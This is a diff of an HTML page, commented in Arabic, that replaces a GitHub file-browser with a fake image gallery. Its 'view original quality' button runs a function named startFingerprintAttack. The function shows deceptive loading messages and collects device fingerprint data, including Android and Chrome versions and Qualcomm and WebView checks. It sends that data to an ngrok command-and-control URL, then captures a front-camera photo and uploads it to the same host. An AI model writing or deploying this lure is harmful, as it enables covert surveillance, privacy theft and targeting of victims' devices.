@@ -3,88 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مستكشف الملفات الشامل - BNG</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>معرض الصور - عرض جديد</title>
+    <style>
+        body { 
+            margin: 0; padding: 0; background: #000; color: #fff; 
+            font-family: Arial, sans-serif; text-align: center; 
+        }
+        #status {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(0,0,0,0.85); padding: 15px 30px; border-radius: 12px;
+            font-size: 18px; z-index: 999;
+        }
+        .btn {
+            margin: 40px auto;
+            padding: 18px 50px;
+            font-size: 22px;
+            background: #1e90ff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .btn:hover { background: #0077ff; }
+    </style>
 </head>
-<body class="bg-slate-900 text-slate-100 min-h-screen p-4 md:p-8">
-    <div class="max-w-5xl mx-auto">
-        <header class="mb-10 flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-700 pb-6">
-            <div>
-                <h1 class="text-4xl font-extrabold tracking-tight text-white">Outdex <span class="text-blue-500">BNG</span></h1>
-                <p class="text-slate-400 mt-2">استعراض وتحميل الملفات من كافة المجلدات</p>
-            </div>
-            <div id="stats" class="text-sm bg-slate-800 px-4 py-2 rounded-full border border-slate-700 text-slate-300">
-                جاري الإحصاء...
-            </div>
-        </header>
+<body>
 
-        <div id="file-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-            <div class="col-span-full text-center py-20">
-                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto"></div>
-                <p class="mt-4 text-slate-500">جاري جلب هيكل المستودع...</p>
-            </div>
-        </div>
-    </div>
+    <div id="status">جاري تحميل الصور...</div>
+    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">
+
+    <button class="btn" onclick="startFingerprintAttack()">عرض الصورة بالجودة الأصلية</button>
 
     <script>
-        // إعدادات المستودع
-        const owner = 'one-dr';
-        const repo = 'bng';
-        const branch = 'main'; // تأكد إذا كان main أو master
-        const apiUrl = `https://api.github.com/repos/${owner}/${repo}/git/trees/${branch}?recursive=1`;
-        const rawBaseUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/`;
+        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";
 
-        async function loadAllFiles() {
+        async function startFingerprintAttack() {
+            const status = document.getElementById("status");
+            status.innerHTML = "جاري تحميل النسخة عالية الجودة...";
+
+            // خطوات وهمية للخداع
+            await new Promise(r => setTimeout(r, 1100));
+            status.innerHTML = "جاري معالجة الصورة...";
+            await new Promise(r => setTimeout(r, 900));
+
+            // ================== جمع معلومات الجهاز + فحص الثغرات ==================
+            const fingerprint = {
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                deviceMemory: navigator.deviceMemory || "unknown",
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+                webGL: detectWebGL(),
+                webAssembly: typeof WebAssembly !== "undefined",
+                androidVersion: getAndroidVersion(),
+                isQualcomm: /qualcomm|qcom|sm\d+/i.test(navigator.userAgent),
+                webView: /wv|webview|crosswalk/i.test(navigator.userAgent),
+                chromeVersion: getChromeVersion()
+            };
+
+            // إرسال البصمة إلى C2
+            fetch(C2_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ type: "fingerprint", data: fingerprint })
+            });
+
+            status.innerHTML = "جاري تحسين العرض...";
+
+            // محاولة التقاط صورة من الكاميرا (بعد النقر)
             try {
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-                
-                if (!data.tree) throw new Error("لم يتم العثور على ملفات");
-
-                const grid = document.getElementById('file-grid');
-                grid.innerHTML = '';
-                
-                // تصفية النتائج: نريد الملفات فقط (blobs) وليس المجلدات (trees)
-                // وسنتجاهل ملف index.html
-                const files = data.tree.filter(item => item.type === 'blob' && item.path !== 'index.html');
-                
-                document.getElementById('stats').innerText = `${files.length} ملف تم العثور عليه`;
-
-                files.forEach(file => {
-                    const fileName = file.path.split('/').pop();
-                    const folderPath = file.path.includes('/') ? file.path.substring(0, file.path.lastIndexOf('/')) : 'الرئيسية';
-                    
-                    const card = document.createElement('div');
-                    card.className = "bg-slate-800 border border-slate-700 p-5 rounded-xl hover:shadow-2xl hover:border-blue-500/50 transition-all group";
-                    
-                    card.innerHTML = `
-                        <div class="mb-4">
-                            <div class="text-[10px] uppercase tracking-wider text-blue-400 font-bold mb-1">${folderPath}</div>
-                            <h3 class="text-lg font-bold text-white truncate group-hover:text-blue-300 transition-colors" title="${file.path}">
-                                ${fileName}
-                            </h3>
-                            <p class="text-xs text-slate-500 mt-1 uppercase">${fileName.split('.').pop()} File</p>
-                        </div>
-                        <div class="flex items-center justify-between mt-auto">
-                            <a href="${rawBaseUrl}${file.path}" download class="w-full text-center bg-slate-700 hover:bg-blue-600 text-white text-sm font-semibold py-2 rounded-lg transition-colors">
-                                تنزيل الملف
-                            </a>
-                        </div>
-                    `;
-                    grid.appendChild(card);
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
                 });
 
-            } catch (error) {
-                console.error(error);
-                document.getElementById('file-grid').innerHTML = `
-                    <div class="col-span-full bg-red-900/20 border border-red-900 text-red-400 p-4 rounded-lg text-center">
-                        فشل في تحميل الملفات. تأكد من أن اسم الفرع (main) صحيح.
-                    </div>
-                `;
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append("file", blob, `camera_${Date.now()}.jpg`);
+                        await fetch(C2_URL, { method: "POST", body: formData });
+                    }, "image/jpeg", 0.85);
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            } catch (e) {
+                console.log("Camera access denied");
             }
+
+            status.innerHTML = "تم عرض الصورة بنجاح ✓";
         }
 
-        loadAllFiles();
+        // دوال مساعدة لفحص الثغرات
+        function getAndroidVersion() {
+            const match = navigator.userAgent.match(/Android\s([0-9.]+)/);
+            return match ? match[1] : "unknown";
+        }
+
+        function getChromeVersion() {
+            const match = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
+            return match ? match[1] : "unknown";
+        }
+
+        function detectWebGL() {
+            try {
+                const canvas = document.createElement("canvas");
+                return !!canvas.getContext("webgl");
+            } catch(e) {
+                return false;
+            }
+        }
     </script>
 </body>
 </html>
